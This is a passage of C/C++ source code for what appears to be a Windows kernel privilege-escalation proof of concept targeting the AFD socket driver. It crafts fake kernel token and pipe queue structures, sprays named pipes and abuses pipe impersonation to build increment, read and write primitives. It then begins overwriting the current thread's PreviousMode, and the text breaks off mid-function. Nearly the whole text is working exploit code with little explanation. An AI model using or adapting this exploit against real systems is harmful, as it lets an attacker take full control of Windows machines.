#include "poc.h"

extern "C" {NTSTATUS NTAPI NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PSIZE_T NumberOfBytesWritten); };
extern "C" {NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten); };
extern "C" {NTSTATUS NTAPI NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength); };
extern "C" {NTSTATUS NTAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength); };
extern "C" {NTSTATUS NTAPI RtlIpv4StringToAddressA(PCSTR   S, BOOLEAN Strict, PCSTR* Terminato, in_addr* Addr); };
extern "C" {NTSTATUS NTAPI NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength); };
extern "C" {NTSTATUS NTAPI NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, IO_STATUS_BLOCK* IoStatusBlock, LARGE_INTEGER* AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength); };
extern "C" {NTSTATUS NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString); };
extern "C" {void * InitializeObjectAttributes(POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING n, ULONG a, HANDLE r, PSECURITY_DESCRIPTOR securityDescriptor); };
extern "C" {NTSTATUS NTAPI NtCreateEvent(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES optional, EVENT_TYPE EvenType, BOOLEAN InitialState); };
extern "C" {NTSTATUS NTAPI NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut); };
extern "C" {NTSTATUS NTAPI NtClose(HANDLE Handle); };
extern "C" {NTSTATUS NTAPI NtWriteFile(HANDLE FileHandle, HANDLE Event, void * ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK *IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key); };
extern "C" {NTSTATUS NTAPI NtFsControlFile(HANDLE FileHandle, HANDLE Event, void* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, ULONG FsControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength); };
extern "C" {NTSTATUS NTAPI NtOpenThreadTokenEx(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, ULONG HandleAttributes, PHANDLE TokenHandle); };
extern "C" {NTSTATUS NTAPI NtQueryInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLen,PULONG ReturnLen); };
extern "C" {NTSTATUS NTAPI NtReadFile(HANDLE FileHandle,HANDLE Event, void *ApcRoutine,PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key); };

NTSTATUS AfdCreate(PHANDLE Handle, ULONG EndpointFlags)
{
    UNICODE_STRING DevName;
    RtlInitUnicodeString(&DevName, L"\\Device\\Afd\\Endpoint");
    const wchar_t* transportName = L"\\Device\\Tcp";

    BYTE bExtendedAttributes[] =
    {
           0x00, 0x00, 0x00, 0x00, // full_ea.NextEntryOffset
           0x00, // full_ea.Flags
           0x0F, // EaNameLength
           0x34, 0x00, // EaValueLength
           // AfdOpenPacketXX
           0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, // 0xf bytes of name + ending zero

           /*

           00000001 enum __bitmask AFD_ENDPOINT_FLAGS // 4 bytes
00000001 {
00000001     AFD_ENDPOINT_FLAG_CONNECTIONLESS = 0x          01,
00000010     AFD_ENDPOINT_FLAG_MESSAGEMODE    = 0x          10,
00000100     AFD_ENDPOINT_FLAG_RAW            = 0x       01 00,
00001000     AFD_ENDPOINT_FLAG_MULTIPOINT     = 0x       10 00,
00010000     AFD_ENDPOINT_FLAG_CROOT          = 0x    01 00 00,
00100000     AFD_ENDPOINT_FLAG_DROOT          = 0x  0 10 00 00,
01000000     AFD_ENDPOINT_FLAG_IGNORETDI      = 0x 01 00 00 00,
10000000     AFD_ENDPOINT_FLAG_RIOSOCKET      = 0x 10 00 00 00,
10000000 };
           */

           0x00, 0x10, 0x01, 0x10, // EndpointFlags = AFD_ENDPOINT_FLAG_RIOSOCKET | AFD_ENDPOINT_FLAG_CROOT | AFD_ENDPOINT_FLAG_MULTIPOINT 
           0x00, 0x00, 0x00, 0x00, // GroupID = 0
           0x02, 0x00, 0x00, 0x00, // AddressFamily = AF_INET
           0x01, 0x00, 0x00, 0x00, // SocketType = SOCK_STREAM
           0x06, 0x00, 0x00, 0x00, // Protocol = IPPROTO_TCP
           0x16, 0x00, 0x00, 0x00, // SizeOfTransportName
           // \Device\Tcp
           0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00,  0x65, 0x00, 0x5C, 0x00, 0x54, 0x00, 0x63, 0x00, 0x70, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    OBJECT_ATTRIBUTES Object;
    Object = { 0 };
    Object.ObjectName = &DevName;
    Object.Length = 48;
    Object.Attributes = 0x40;

    IO_STATUS_BLOCK IoStatusBlock;
  
    return NtCreateFile(Handle, 0xC0140000, &Object, &IoStatusBlock, 0, 0, 3, FILE_OPEN_IF, 0x20, &bExtendedAttributes, sizeof(bExtendedAttributes));
}

NTSTATUS AfdBind(mm *main,HANDLE SocketHandle)
{
    NTSTATUS Status;
    IO_STATUS_BLOCK IoStatus;
    Status = NtDeviceIoControlFile(SocketHandle, 0, 0, 0, &IoStatus, IOCTL_AFD_BIND, main->input, 0x78004LL, main->fake_data_entry, 0x78004LL);
    return Status;
}

NTSTATUS AfdConnect(mm *main,HANDLE hNtSock2, HANDLE hNtSock1)
{
    
    
    IO_STATUS_BLOCK IoStatus;
    //MY_AFD_CONNECT_INFO input;
    //memset(&input, 0, sizeof(input));

    unsigned char input[] =
    {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SanActive
            (char)hNtSock1, (char)(((uint32_t)hNtSock1) >> 8), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // RootEndpoint
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ConnectEndpoint
            0x01, 0x00, 0x00, 0x00, // TRANSPORT_ADDRESS.TAAddressCount

            0x10, 0x00, // AddressLength;
            0x02, 0x00, // AddressType			
            0x00, 0x87, // port
            0x7F, 0x00, 0x00, 0x01, // in_addr 127.0.0.1
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // sin_zero
    };
    NTSTATUS Status = NtDeviceIoControlFile(hNtSock2, NULL, NULL, NULL, &IoStatus, IOCTL_AFD_CONNECT, &input, 0x30, NULL, NULL);

    return Status;
}

NTSTATUS AfdListen(HANDLE hNtSock2) 
{
    NTSTATUS status;
    IO_STATUS_BLOCK IoStatus;
    AFD_LISTEN_INFO inputListen = {0};
    inputListen.MaximumConnectionQueue = 1;
    status = NtDeviceIoControlFile(hNtSock2, NULL, NULL, NULL, &IoStatus, IOCTL_AFD_LISTEN, &inputListen, 12, 0,0);

    return status;
}

PVOID FindSysBase(const char* moduleName) 
{
    NTSTATUS status;
    ULONG bytes = 0;
    LPVOID mem;

    do {
        mem = VirtualAlloc(NULL, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memset(mem, 0, bytes);

        status = NtQuerySystemInformation(SystemModuleInformation, mem, bytes, &bytes);
    } while (status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL);

    if (status != STATUS_SUCCESS) {
        printf("[-] Could not NtQuerySystemInformation.\n");
        ExitProcess(1);
    }

    _SYSTEM_MODULE_INFORMATION* smi = (_SYSTEM_MODULE_INFORMATION*)mem;

    for (uint32_t i = 0; i < smi->Count; i++) {
        UCHAR* module_name = smi->Module[i].FullPathName + smi->Module[i].OffsetToFileName;
        if (_stricmp((char*)module_name, moduleName) == 0)
            return smi->Module[i].ImageBase;
    }
    printf("[-] Could not find ntoskrnl.\n");
    ExitProcess(1);
}

PVOID FindCurrentKTHREAD() {
    HANDLE duplicated_handle;
    DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &duplicated_handle, 0, FALSE, DUPLICATE_SAME_ACCESS);

    NTSTATUS status;
    ULONG bytes = 0;
    LPVOID mem;

    do {
        mem = VirtualAlloc(NULL, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memset(mem, 0, bytes);

        status = NtQuerySystemInformation(SystemExtendedHandleInformation, mem, bytes, &bytes);
    } while (status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL);

    if (status != STATUS_SUCCESS) {
        printf("[ERROR] Could not NtQuerySystemInformation.\n");
        ExitProcess(1);
    }

    _SYSTEM_HANDLE_INFORMATION_EX* shi = (_SYSTEM_HANDLE_INFORMATION_EX*)mem;
    DWORD current_process_id = GetCurrentProcessId();
    for (int i = 0; i < shi->NumberOfHandles; i++) {
        if (shi->Handles[i].UniqueProcessId == current_process_id && (HANDLE)shi->Handles[i].HandleValue == duplicated_handle) {
            NtClose(duplicated_handle);
            return shi->Handles[i].Object;
        }
    }
 
    printf("[ERROR] Could not find current thread's KTHREAD.\n");
    ExitProcess(1);
}

PVOID CreateEvilStructs(mm *main) 
{

    int sz = OFFSET_IN_TOKEN_VARIABLEPART + 0x4C;

    ERESOURCE* TokenLock = (ERESOURCE*) VirtualAlloc(0, 0x68, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!TokenLock) {
        LocalFree(TokenLock);
        printf("[ERROR] Wrong TokenLock allocation");
        ExitProcess(1);
    }
   
    memset(TokenLock, 0, 0x68);
    VirtualLock(TokenLock, 0x68);

    TokenLock->SystemResourcesList.Flink = &TokenLock->SystemResourcesList;
    TokenLock->SystemResourcesList.Blink = &TokenLock->SystemResourcesList;

    _OBJECT_HEADER* objHeader =(_OBJECT_HEADER*) VirtualAlloc(0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!objHeader)
    {
        LocalFree(objHeader);
        printf("[ERROR] Worng client_token allocation");
        ExitProcess(1);
    }
    VirtualLock(objHeader,sz);

    objHeader->PointerCount = 1;
    _SID_AND_ATTRIBUTES* psid = (_SID_AND_ATTRIBUTES*)((BYTE*)objHeader + sz);
    psid->Attributes = 6;
    psid->Sid = psid;
    *((BYTE*)psid + 0x10)= (WORD)0x101;
    //_TOKEN *pclient_token = (_TOKEN*)LocalAlloc(LMEM_ZEROINIT, sizeof(_TOKEN));

    _TOKEN * pclient_token = &objHeader->Body;

    void* pVariablePartDefaultDacl = LocalAlloc(LMEM_ZEROINIT, sizeof(ACL));
    if (pVariablePartDefaultDacl)
    {
        void* pPrimaryGroup = LocalAlloc(LMEM_ZEROINIT, 8);
        if (pPrimaryGroup) 
        {
            *(BYTE*)pPrimaryGroup = (BYTE)pVariablePartDefaultDacl + 8;
            _SEP_LOGON_SESSION_REFERENCES* pLogonSession = (_SEP_LOGON_SESSION_REFERENCES *) LocalAlloc(LMEM_ZEROINIT, sizeof(_SEP_LOGON_SESSION_REFERENCES));
            if (pLogonSession)
            {
                pLogonSession->ReferenceCount = 1;
                _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes = (_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION*)LocalAlloc(LMEM_ZEROINIT, sizeof(AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION));
                if (pSecurityAttributes)
                {
                    pSecurityAttributes->SecurityAttributeCount = 0;
                    PSEP_SID_VALUES_BLOCK pTokenSidValues = (PSEP_SID_VALUES_BLOCK)LocalAlloc(LMEM_ZEROINIT, sizeof(SEP_SID_VALUES_BLOCK));
                    if(pTokenSidValues)
                    {
                        pTokenSidValues->ReferenceCount = 1;
                        pclient_token->TokenLock = TokenLock;
                        pclient_token->IntegrityLevelIndex = 0xFFFFFFFF;
                        pclient_token->AuthenticationId.LowPart = 0x3e6;
                        pclient_token->AuthenticationId.HighPart = 0;
                        pclient_token->TokenType = TokenImpersonation;
                        pclient_token->ImpersonationLevel = SecurityImpersonation;
                        pclient_token->MandatoryPolicy = 0;
                        pclient_token->VariableLength = 0x11C;
                        pclient_token->UserAndGroupCount = 0;
                        pclient_token->UserAndGroups = psid;//Not RIGHT fix it TODO
                        pclient_token->VariablePart = (ULONG) pVariablePartDefaultDacl;
                        pclient_token->DefaultDacl = (PACL)pVariablePartDefaultDacl;
                        pclient_token->PrimaryGroup = pPrimaryGroup;
                        pclient_token->LogonSession = pLogonSession;
                        pclient_token->pSecurityAttributes = pSecurityAttributes;
                        pclient_token->TokenSidValues = pTokenSidValues;
                        
                        PSECURITY_CLIENT_CONTEXT pclient_context = (PSECURITY_CLIENT_CONTEXT)LocalAlloc(LMEM_ZEROINIT, sizeof(SECURITY_CLIENT_CONTEXT));
                        if (pclient_context) 
                        {
                            pclient_context->DirectAccessEffectiveOnly = 0;
                            pclient_context->ServerIsRemote = 0;
                            pclient_context->DirectlyAccessClientToken = 0;
                            pclient_context->SecurityQos.Length = 12;
                            pclient_context->SecurityQos.ContextTrackingMode = 1;
                            pclient_context->SecurityQos.EffectiveOnly = 0;
                            pclient_context->SecurityQos.ImpersonationLevel = SecurityImpersonation;
                            pclient_context->ClientToken = pclient_token;

                            void* fake_data_entry = LocalAlloc(0x40u, 0x78004);
                            if (fake_data_entry) 
                            {
                                memset(fake_data_entry, 'X', 0x78004);
             
                                //Creating FAKE_DATA_QUEUE_ENTRY_, that will be send to AFD_BIND
                                memset(((BYTE*)fake_data_entry + 4), 0, 4);
                                *((DWORD*)fake_data_entry + 1) = LODWORD((__int64)fake_data_entry + 4);
                                *((DWORD*)fake_data_entry + 2) = HIDWORD((__int64)fake_data_entry + 4);
                                *((DWORD*)fake_data_entry + 3) = LODWORD((__int64)fake_data_entry + 4);
                                *((DWORD*)fake_data_entry + 4) = HIDWORD((__int64)fake_data_entry + 4);
                                *((DWORD*)fake_data_entry + 5) = 0x00000000;
                                *((DWORD*)fake_data_entry + 6) = 0x00000000;
                                *((DWORD*)fake_data_entry + 7) = (DWORD)LODWORD(pclient_context);
                                *((DWORD*)fake_data_entry + 8) = (DWORD)HIDWORD(pclient_context);
                                *((DWORD*)fake_data_entry + 9) = 0x00000000;
                                *((DWORD*)fake_data_entry + 10) = 0x00000000;
                                *((DWORD*)fake_data_entry + 11) = 0x00077FD0;
                                *((DWORD*)fake_data_entry + 12) = 0x00000000;

                                /*  It should look like this
                                    4B 4B 4B 4B 14 10 5F 9C 15 02 00 00 14 10 5F 9C
                                    15 02 00 00 00 00 00 00 00 00 00 00 41 41 41 41
                                    00 00 00 00 00 00 00 00 00 00 00 00 D0 7F 07 00
                                    00 00 00 00 4B 4B 4B 4B 4B 4B 4B 4B 4B 4B 4B 4B
                                */
                                
                                /*
                                void* p_mem_0xD0_addr_to_write = LocalAlloc(LMEM_ZEROINIT, 0xD0);
                                void* p_mem_0x1000 = LocalAlloc(LMEM_ZEROINIT, 0x1000);
                                void* p_mem_0x30 = LocalAlloc(LMEM_ZEROINIT, 0x30);
                                */
                               // void* crafted_io_stack_location = LocalAlloc(LMEM_ZEROINIT, 0x48);
                                




                                unsigned char* input = (unsigned char*)LocalAlloc(0x40u, 0x78004);
                                memset(input, 0, 0x78004);

                                input[4] = 0x01;
                                input[8] = 0x10;
                                input[10] = 0x02;
                                input[14] = 0x7F;
                                input[17] = 0x01;


                                main->crafted_irp =(_IRP*) LocalAlloc(LMEM_ZEROINIT, 0x0D);
                                main->p_mem_0x30= LocalAlloc(LMEM_ZEROINIT, 0x30);
                                main->p_mem_Pipe_hToPipe_1000_rw = LocalAlloc(LMEM_ZEROINIT, 0x1000);
                                main->p_mem_0xD0_2 = LocalAlloc(LMEM_ZEROINIT, 0x0D);
                                main->crafted_arbitrary_io_stack_location = (IO_STACK_LOCATION*)LocalAlloc(LMEM_ZEROINIT, 0x40);
                                main->pSecurityAttributes = pSecurityAttributes;
                                main->p_mem_Pipe_hToPipe_1000_rw_2= LocalAlloc(LMEM_ZEROINIT, 0x1000);
                                main->LogonSession = pLogonSession;
                                main->security_client_context = pclient_context;
                                main->TokenSidValues = pTokenSidValues;
                                main->fakeToken = pclient_token;
                                main->sizeOfClientTokenAndObjectHeader = sz;
                                main->VariablePartDefaultDacl = (ACL*)pVariablePartDefaultDacl;
                                main->PrimaryGroup = pPrimaryGroup;
                                main->TokenLock = TokenLock;
                                main->VariablePartDefaultDacl2 =(ACL*) pVariablePartDefaultDacl;

                                main->fake_data_entry = fake_data_entry;
                                main->input = input;
                            }

                        }
                    }
                }
            }
        
        }

    }




    
    return 0;
}

NTSTATUS WritingToIM_pipe(mm* m) 
{
    NTSTATUS status;
    IO_STATUS_BLOCK statusBlock;
    void* buffer = (BYTE*)(m->fake_data_entry)+4;
    for (int i = 0; i < 16; i++) 
    {
        status = NtWriteFile(m->hPipeIM, 0, 0, 0, &statusBlock, buffer, 0x77FD0, 0, 0);
    }

    return status; 
}

NTSTATUS AfdGetSockName(HANDLE SockHandle, mm *m) {
    NTSTATUS status;
    IO_STATUS_BLOCK statusBlock;
    status = NtDeviceIoControlFile(SockHandle, 0, 0, 0, &statusBlock, IOCTL_AFD_GET_SOCK_NAME, 0, 0, m->fake_data_entry, 0x78004);

    return status;
}

BOOLEAN PipePeek(HANDLE hFileIM, void* out, int i) {

    NTSTATUS ntfsctlstatus = {};
    NTSTATUS ntEventStatus = {};
    BOOLEAN succ = FALSE;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK statusblock;
    PHANDLE evnthandle = {};

    int len = i + 16;
    void* memAlloc = LocalAlloc(LMEM_ZEROINIT, len);
    objAttr.Length = 0x30;
    objAttr.SecurityDescriptor = 0;
    objAttr.SecurityQualityOfService = 0;
    
    ntEventStatus = NtCreateEvent(evnthandle, 0x1F0003, &objAttr, NotificationEvent, 0);
    if (!NT_SUCCESS(ntEventStatus))
    {
        ntfsctlstatus = NtFsControlFile(hFileIM,evnthandle,0,0,&statusblock, FSCTL_PIPE_PEEK,0,0,memAlloc,len);
        if (!NT_SUCCESS(ntfsctlstatus)) 
        {
            printf("[ERORR] code: %x Couldnt PEEK data from the PIPE", ntfsctlstatus);
            ExitProcess(1);
        }
        if (STATUS_PENDING == ntfsctlstatus) {

            NtWaitForSingleObject(evnthandle, 0, 0);
        }

        memmove(out, ((BYTE *)memAlloc) + 16, i);
        NtWaitForSingleObject(evnthandle, 0, 0);
        NtClose(evnthandle);
        succ = TRUE;
    }
    LocalFree(memAlloc);

    return succ;
}

NTSTATUS ResetImpersioationToken(mm *m) 
{
    _TOKEN_PRIMARY_GROUP token_primary_group = {0};
    _SEP_TOKEN_PRIVILEGES *tokenPriv = &m->fakeToken->Privileges;
    if (tokenPriv) 
    {
        tokenPriv->Enabled = 0;
        tokenPriv->EnabledByDefault = 0;
        tokenPriv->Present = 0;
    }
    return NtSetInformationThread((HANDLE)0xFFFFFFFFFFFFFFFE, (THREADINFOCLASS)TokenPrimaryGroup, &token_primary_group, 8);
}

BOOLEAN GetIncPrimitive(mm* m) {
    IO_STATUS_BLOCK statusblock;
    void* output = LocalAlloc(LMEM_ZEROINIT, 0x780000);

    if (output) 
    {

        for (int i = 0x77FD0; i < 0x7F7CD0; i += 0x77FD0) 
        {

            PipePeek(m->hFileIM, output, i);

            if (NT_SUCCESS(NtFsControlFile(m->hPipeIM, 0, 0, 0, &statusblock, FSCTL_PIPE_IMPERSONATE, 0, 0, 0, 0)))
            {
                if (STATUS_SUCCESS == ResetImpersioationToken(m))
                {
                    LocalFree(output);
                    return 0;
                }
                
            }

        }
        for (int i = 0; i < 16; i++)
        {
            NtReadFile(m->hFileIM, 0, 0, 0, &statusblock, output, 0x77FD0, 0, 0);
        }
    }
    else {
        return 1;
    }
    LocalFree(output);
    return 0;
}

ULONG_PTR GetKernelAddr(HANDLE hUserMode) 
{

    void* memAlloc = LocalAlloc(LMEM_ZEROINIT, 0x1000);
    ULONG lenSystemInfo=0x1000;
    PVOID object=0;
    NTSTATUS queryStatus = NtQuerySystemInformation(SystemExtendedHandleInformation,memAlloc, 0x1000,&lenSystemInfo);
    DWORD processID = GetCurrentProcessId();
    if (STATUS_INFO_LENGTH_MISMATCH == queryStatus || queryStatus >= 0) 
    {
        LocalFree(memAlloc);
        int len = (lenSystemInfo) + 0x100;
        SYSTEM_HANDLE_INFORMATION_EX* systemHandleTableInfo = (SYSTEM_HANDLE_INFORMATION_EX*)LocalAlloc(LMEM_ZEROINIT, len);

        NTSTATUS queryStatus2 = NtQuerySystemInformation(SystemExtendedHandleInformation, systemHandleTableInfo, len,&lenSystemInfo);
        if (!STATUS_SUCCESS(queryStatus2)) 
        {
        
                for (int i = 0; i < systemHandleTableInfo->NumberOfHandles; i++) 
                {
                    if ((HANDLE)systemHandleTableInfo->Handles[i].HandleValue == hUserMode && systemHandleTableInfo->Handles[i].UniqueProcessId == processID)
                    {
                        object = systemHandleTableInfo->Handles[i].Object;
                        break;
                    }
                }
        }
    }
    return (ULONG_PTR)object;
}

PVOID GetPipeClientControlBlock(mm*m,HANDLE hPipe) {

    IO_STATUS_BLOCK statusblock;
    ULONG_PTR pFileObjectPIPE = GetKernelAddr(hPipe);
    HANDLE ThreadHandle=0;
    ULONG uBytes=0;
    _FILE_OBJECT** token_default_dacl = { 0 };
    m->fakeToken->PrimaryGroup =(void*) pFileObjectPIPE;
    m->fakeToken->DynamicPart = (ULONG*) pFileObjectPIPE;
    m->fakeToken->DefaultDacl = (_ACL*) pFileObjectPIPE;
    NTSTATUS ntStatusNtFsC = NtFsControlFile(m->hPipeIM, 0, 0, 0, &statusblock, FSCTL_PIPE_IMPERSONATE, 0, 0, 0, 0);
    if (NT_SUCCESS(ntStatusNtFsC))
    {
        NTSTATUS ntStatusOpenThread = NtOpenThreadTokenEx((HANDLE)0xFFFFFFFFFFFFFFFE, TOKEN_ALL_ACCESS, 1, 0, &ThreadHandle);
        if (NT_SUCCESS(ntStatusOpenThread)) //Open token for a current thread
        {
            NTSTATUS ntStatusQueryInfoLen = NtQueryInformationToken(ThreadHandle, TokenDefaultDacl, 0, 0, &uBytes);
            if (ntStatusQueryInfoLen == STATUS_BUFFER_TOO_SMALL)
            {

                token_default_dacl = (_FILE_OBJECT**)LocalAlloc(LMEM_ZEROINIT, (unsigned int)uBytes);
                 *token_default_dacl = (_FILE_OBJECT*)LocalAlloc(LMEM_ZEROINIT, (unsigned int)uBytes);
                NTSTATUS ntStatusQueryInfo = NtQueryInformationToken(ThreadHandle, TokenDefaultDacl, token_default_dacl, uBytes, &uBytes);
                if (NT_SUCCESS(ntStatusQueryInfo))
                {
                    void* ccb_of_im_token = (void*) ((*token_default_dacl)->FsContext2);
                    ccb_of_im_token = (__int64*)((__int64)ccb_of_im_token&0xFFFFFFFFFFFFFFFC);// get the FILE_OBJECT of Named Pipe
                    return ccb_of_im_token;
                }
                else {
                    printf("[ERROR code:0x%x] Couldnt query TokenDefaultDacl from current thread token", ntStatusQueryInfo);
                }
            }
            else {
                printf("[ERROR code:0x%x] Couldnt query length of TokenDefaultDacl from current thread token", ntStatusQueryInfoLen);
            }
        }
        else {
            printf("[ERROR code:0x%x] Couldnt open current thread token", ntStatusOpenThread);
        }

    }
    else {
        printf("[ERROR code:0x%x] Couldnt Impersonate IM PIPE", ntStatusNtFsC);
    }
    ResetImpersioationToken(m);
    m->fakeToken->PrimaryGroup = m->VariablePartDefaultDacl;
    m->fakeToken->DynamicPart =(ULONG*) m->VariablePartDefaultDacl;
    m->fakeToken->DefaultDacl = m->VariablePartDefaultDacl;
    if (ThreadHandle != (HANDLE)-1) 
    {
        NtClose(ThreadHandle);
    }
    if (token_default_dacl)
        LocalFree(token_default_dacl);
    return 0;
}

int IncrementPrimitive(mm* m, __int64* rw_control_block, PHANDLE tokenThread) {

    IO_STATUS_BLOCK statusblock;
    //HANDLE hToken;
    void* LogonSession = &m->fakeToken->LogonSession;
    *((__int64*)LogonSession) = (__int64)((BYTE*)rw_control_block - 0x18);
    NTSTATUS ntStatusNtFsC = NtFsControlFile(m->hPipeIM, 0, 0, 0, &statusblock, FSCTL_PIPE_IMPERSONATE, 0, 0, 0, 0);
    if (!NT_SUCCESS(ntStatusNtFsC)) {
        printf("[ERROR code:0x%x] Couldnt Impersonate IM PIPE", ntStatusNtFsC);
        return 1;
    }
    NtOpenThreadTokenEx(CURRENT_THREAD, 0xF01FF, 1, 0, tokenThread);

    ResetImpersioationToken(m);
    m->fakeToken->LogonSession = LogonSession;

    return 0;
}

void* GetReadPrimitive(mm* m) {
    void* pMemPipeRW = m->p_mem_Pipe_hToPipe_1000_rw;
    IO_STATUS_BLOCK statusBlock;
    DATA_QUEUE_ENTRY* fake_data_queue_entry = {0};
    HANDLE tokenThread;
    if (pMemPipeRW) 
    {
        memset(pMemPipeRW, 0, 0x1000);
        fake_data_queue_entry = (DATA_QUEUE_ENTRY*)((BYTE*)pMemPipeRW + 0xD0);
    }
    fake_data_queue_entry->Flink =(uint64_t) m->security_client_context;

    NtWriteFile(m->hPipeRW, 0, 0, 0, &statusBlock, pMemPipeRW, 0x1000,0,0);
    if (!IncrementPrimitive(m, (__int64*)((BYTE*)m->pipe_100_rw_control_block + 0xA8 + 1), &tokenThread))
    {
        m->IncPrimitiveTOKEN = tokenThread;
        return 0;
    }
    
    return 0;
}

int GetWritePrimitive(mm* m) {
    void* pMemPipeRW = m->p_mem_Pipe_hToPipe_1000_rw_2;
    IO_STATUS_BLOCK statusBlock;
    IO_STATUS_BLOCK statusBlock2;
    DATA_QUEUE_ENTRY* fake_data_queue_entry = { 0 };
    HANDLE tokenThread1;
    HANDLE tokenThread2;
    HANDLE tokenThread3;
    _SECURITY_CLIENT_CONTEXT* ClientInfo = 0;
    if (pMemPipeRW)
    {
        memset(pMemPipeRW, 0, 0x1000);
        fake_data_queue_entry = (DATA_QUEUE_ENTRY*)((BYTE*)pMemPipeRW + 0xD0);
    }
    IncrementPrimitive(m, (__int64*)((BYTE*)m->pipe_100_rw_control_block + 0x48 + 0x10), &tokenThread1);
    ClientInfo =(_SECURITY_CLIENT_CONTEXT*)((BYTE*)m->pipe_100_rw_control_block + 0x48);

    fake_data_queue_entry->Blink = (uint64_t) ClientInfo;
    fake_data_queue_entry->Flink = (uint64_t) ClientInfo;
    fake_data_queue_entry->SecurityContext = 0;
    fake_data_queue_entry->QuotaInEntry = -1;
    fake_data_queue_entry->DataSize = -1;
    fake_data_queue_entry->EntryType = 1;
    fake_data_queue_entry->Irp = (_IRP*)m->crafted_irp;

    NtWriteFile(m->hFileRW, 0, 0, 0, &statusBlock, pMemPipeRW, 0x1000, 0, 0);
    if (IncrementPrimitive(m, (__int64*)((BYTE*)m->pipe_100_rw_control_block + 0x48 + 0x1), &tokenThread2) ||
        IncrementPrimitive(m, (__int64*)((BYTE*)m->pipe_100_rw_control_block + 0x48 + 0x13), &tokenThread3)) {
        return 0;
    }
    
    if (tokenThread1 != INVALID_HANDLE_VALUE && tokenThread1) 
    {
        NtClose(tokenThread1);
    }

    if (tokenThread3 != INVALID_HANDLE_VALUE && tokenThread3)
    {
        NtClose(tokenThread3);
    }
    //__debugbreak();
    char w[] = {0x0C,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x01,0x01,0x00,0x00};
    void* addrToWrite = (__int64*)((BYTE*)m->pipe_100_rw_control_block + 0xC); // just test 
    m->crafted_irp->AssociatedIrp.SystemBuffer = addrToWrite;
    m->crafted_arbitrary_io_stack_location->MajorFunction = 0xD;
    m->crafted_arbitrary_io_stack_location->Parameters.Create.Options = FSCTL_PIPE_INTERNAL_WRITE;
    m->crafted_irp->Tail.Overlay.CurrentStackLocation = m->crafted_arbitrary_io_stack_location;
    //m->crafted_irp->Tail.Overlay.CurrentStackLocation->MajorFunction = 0xD;
    //m->crafted_irp->Tail.Overlay.CurrentStackLocation->Parameters.Create.Options= FSCTL_PIPE_INTERNAL_WRITE;
    
    NtWriteFile(m->hFileRW, 0, 0, 0, &statusBlock2, &w, 0xC, 0, 0);
    m->RWPrimitiveTOKEN = tokenThread2;
    return 1;
}

int CrashPreviousMode(mm* m) 
{
    IO_STATUS_BLOCK statusBlock;
    DATA_QUEUE_ENTRY* fake_data_queue_entry = { 0 };
    PVOID currentKTHREAD = (PVOID)FindCurrentKTHREAD();
    uint8_t b = 0;
    PVOID addrToWrite = (uint8_t*)currentKTHREAD + PREVIOUS_MODE_OFFSET;
    m->crafted_irp->AssociatedIrp.SystemBuffer = addrToWrite;
    m->crafted_arbitrary_io_stack_location->MajorFunction = 0xD;
    m->crafted_arbitrary_io_stack_location->Parameters.Create.Options = FSCTL_PIPE_INTERNAL_WRITE;
